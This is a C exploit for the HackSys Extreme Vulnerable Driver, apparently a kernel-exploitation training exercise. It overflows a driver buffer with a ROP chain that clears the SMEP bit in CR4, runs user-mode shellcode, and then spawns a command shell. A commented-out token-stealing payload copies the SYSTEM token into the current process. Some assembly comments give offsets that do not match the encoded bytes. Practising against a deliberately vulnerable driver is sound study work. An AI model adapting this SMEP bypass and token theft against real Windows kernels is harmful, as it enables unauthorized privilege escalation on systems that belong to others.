#include <stdio.h>
#include <windows.h>
#include <psapi.h>

/*
    This is base on Connor's McGarr's python code at
    https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/

dt nt!_KPCR:

Prcb _KPRCB:
+0x180

dt_nt!_KPRCB
CurrentThread    : Ptr64 _KTHREAD
+0x008
---------------------------------------
KTHREAD OFFSET: 0x188

dt nt!_KTHREAD
ApcState         : _KAPC_STATE
+0x098

dt nt!_KAPC_STATE
+0x020 Process          : Ptr64 _KPROCESS
------------------------------------------

dt nt!_EPROCESS
+0x448 ActiveProcessLinks : _LIST_ENTRY

+0x4b8 Token            : _EX_FAST_REF

+0x440 UniqueProcessId  : Ptr64 Void
*/

#define OVERFLOW_VALUE 2072//2072
#define NUM_OF_ROPS  4
/*
 const unsigned char payload[] = {
    "\x65\x48\x8B\x04\x25\x88\x01\x00\x00"              // mov rax,[gs:0x188]  ; Current thread (KTHREAD)
    "\x48\x8B\x80\xB8\x00\x00\x00"                      // mov rax,[rax+0xb8]  ; Current process (EPROCESS)
    "\x48\x89\xC3"                                     // mov rbx,rax         ; Copy current process to rbx
    "\x48\x8B\x9B\x48\x04\x00\x00"                      // mov rbx,[rbx+0x2e8] ; ActiveProcessLinks
    "\x48\x81\xEB\x48\x04\x00\x00"                      // sub rbx,0x2e8       ; Go back to current process
    "\x48\x8B\x8B\x40\x04\x00\x00"                      // mov rcx,[rbx+0x2e0] ; UniqueProcessId (PID)
    "\x48\x83\xF9\x04"                                  // cmp rcx,byte +0x4   ; Compare PID to SYSTEM PID
    "\x75\xE5"                                          // jnz 0x13            ; Loop until SYSTEM PID is found
    "\x48\x8B\x8B\xB8\x04\x00\x00"                      // mov rcx,[rbx+0x358] ; SYSTEM token is @ offset _EPROCESS + 0x348
    "\x80\xE1\xF0"                                      // and cl, 0xf0        ; Clear out _EX_FAST_REF RefCnt
    "\x48\x89\x88\xB8\x04\x00\x00"                      // mov [rax+0x358],rcx ; Copy SYSTEM token to current process
    "\x48\x83\xC4\x20"                                  // add rsp, 0x20       ; RESTORE (Specific to HEVD)
    "\xC3"
};
*/

 const unsigned char payload[] = {
    "\x48\x83\xC4\x10"                                  // add rsp, 0x10       ; RESTORE (Specific to HEVD)
    "\xC3"
};


void HexPrint(unsigned char* data, size_t size);
LPVOID FindBaseAddressOfNtoKrnl();
LPVOID AllocateAndMoveShellCode();
unsigned char *CreatePayload(LPVOID kernelAddress, LPVOID shellcodePtr);
int GetBufferSize();
bool SendPayload(unsigned char *payload);

int main()
{
    LPVOID ptr=NULL;
    LPVOID kernelBaseAddress = NULL;
    unsigned char* payload=NULL;

    ptr = AllocateAndMoveShellCode();

    if (ptr)
    {
        kernelBaseAddress = FindBaseAddressOfNtoKrnl(); 

        if (kernelBaseAddress)
        {
            payload = CreatePayload(kernelBaseAddress, ptr);

            if (payload)
            {
                if (SendPayload(payload))
                {
                    printf("[+] Payload sent!\n");
                    system("cmd.exe /k cd C:\\");
                } else {
                    printf("[-] Unable to send payload!\n");
                }
            }
        }
    }
    return 0;
}



LPVOID FindBaseAddressOfNtoKrnl()
{
    LPVOID base[1024] = {};
    DWORD cbNeeded = 0;

    printf("[!] Finding ntokrnl base\n");
    if (EnumDeviceDrivers(base,1024,&cbNeeded))
    {
        if (base[0])
        {
            printf("[+] Found Address of ntokrnl.exe at %p\n",base[0]);
            return base[0];
        } else {
            printf("[-] Error Can't Find ntokrnl's base Address\n");
        }
    }

    return 0;
}

LPVOID AllocateAndMoveShellCode()
{
    void *ptr = NULL;

    printf("[!] Allocating %zi RWX region for shellcode\n",sizeof(payload));

    ptr = VirtualAlloc(0,sizeof(payload), 0x3000,0x40);

    if (ptr)
    {
        MoveMemory(ptr,payload,sizeof(payload));
        #ifdef DEBUG
        HexPrint((unsigned char*)ptr,sizeof(payload));
        #endif
    } else {
        printf("[-] Unable to allocate memory!\n");
    } 

    return ptr;
}


unsigned char *CreatePayload(LPVOID kernelAddress, LPVOID shellcodePtr)
{
    unsigned char *buffer = NULL;
    int totalSize = 0;
    int bufferVal = 0;
    unsigned __int64 popRcx = 0;
    unsigned __int64 smepValue = 0;
    unsigned __int64 movCr4 = 0;

    totalSize = GetBufferSize();

    buffer = (unsigned char*) VirtualAlloc(0,totalSize, 0x3000,0x40);
 
    bufferVal = OVERFLOW_VALUE;

    memset(buffer,0x41,bufferVal);
 
    printf("[+] Starting ROP chain, Goodbye SEMP...\n");

    popRcx = ((unsigned __int64) kernelAddress) + 0x707cb8;

    MoveMemory( buffer+bufferVal,(const void*) &popRcx, sizeof(unsigned long long));
    bufferVal += sizeof(unsigned long long);

    printf("[+] Flipped SMEP bit to 0 in RCX\n");
    smepValue = 0x506f8;
    MoveMemory( buffer+bufferVal,(const void*) &smepValue, sizeof(unsigned long long));

    bufferVal += sizeof(unsigned long long);
 
    printf("[+] Placed disabled SMEP value in CR4!\n");

    movCr4 = ((unsigned __int64) kernelAddress) + 0x411505;
    MoveMemory( buffer+bufferVal,(const void*) &movCr4, sizeof(unsigned long long));
    bufferVal += sizeof(unsigned long long);

    MoveMemory( buffer+bufferVal,(const void*) &shellcodePtr, sizeof(unsigned long long));
    bufferVal += sizeof(unsigned long long);
    #ifdef DEBUG
    HexPrint(buffer,bufferVal);
    #endif

    return buffer;
}

void HexPrint(unsigned char* data, size_t size)
{
    for (int i=0; i < size; i++)
    {
        if (i % 16 == 0 && i != 0)
        {
            printf("\n");
        }

        printf("0x%02x ", data[i] & 0xFF);
    }

    printf("\n");
}

int GetBufferSize()
{
    return OVERFLOW_VALUE + (NUM_OF_ROPS * sizeof(unsigned long long));
}

bool SendPayload(unsigned char *payload)
{
    HANDLE deviceHandle;
    LPDWORD bytesReturned;

    deviceHandle = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",0xC0000000,0,NULL,0x3,0,NULL );

    if (!deviceHandle) return false;

    if (!DeviceIoControl(deviceHandle,0x222003,payload,GetBufferSize(),NULL,0,bytesReturned,NULL)) return false;

    return true;
}
